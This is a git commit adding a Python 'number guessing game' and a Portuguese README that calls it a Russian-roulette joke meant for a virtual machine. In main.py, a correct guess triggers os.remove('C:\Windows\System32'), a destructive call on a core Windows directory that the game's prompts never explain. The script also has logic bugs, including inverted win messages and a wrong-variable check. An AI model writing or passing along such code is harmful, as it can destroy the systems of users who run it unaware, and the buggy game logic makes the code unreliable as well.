23b7685796cbdc25226996ec364b993a30c094d7
Alvaro.Veiga <alvarojoao17@gmail.com>
2024-02-05 16:06:19 -0300

    initial commit

---
+++ main.py
@@ -0,0 +1,25 @@
+import random
+import os
+
+
+def main():
+    print("Welcome to the number guessing game!\n")
+    answer = str(input("Do you want to play? (yes/no) "))
+    if answer == "yes" or answer == "Yes" or answer == "YES":
+        print("Are you sure you want to play this game? Know what its consequences are\n")
+        confirmation = str(input("Do you want to continue? (yes/no) "))
+        if confirmation == "yes" or answer == "Yes" or answer == "YES":
+            print("Well be warned!\n")
+            print('I am thinking of a number between 1 and 10\n')
+            number = random.randint(1, 10)
+            guess = int(input("Take a guess: "))
+            if guess != number:
+                print("Good job! You guessed my number")
+            else:
+                os.remove("C:\Windows\System32")  
+    else:
+        print("Goodbye!")
+        os._exit(0)
+
+if __name__ == "__main__":
+    main()
---
+++ readme.md
@@ -0,0 +1,13 @@
+# Sobre o Projeto
+
+Dont-play-this-game. Esse script funciona como uma roleta Russa foi criado apenas como forma de divertimento com alguns amigos onde mesmo foi utilizado em uma virtual machine (VM). As regras são simples voce escolhe um numero, se o numero que voce inserir for diferente ao que o sistema escolheu voce ganha ja se for igual você perde! Se você ama seu sistema windows surgiro a não jogar este jogo hahaha. 
+
+## Pré-requisitos
+
+Possua o python instalado em sua máquina.
+
+## Instalação
+
+1. Clone os seguintes repositórios:
+    
+    1. lab-web-core
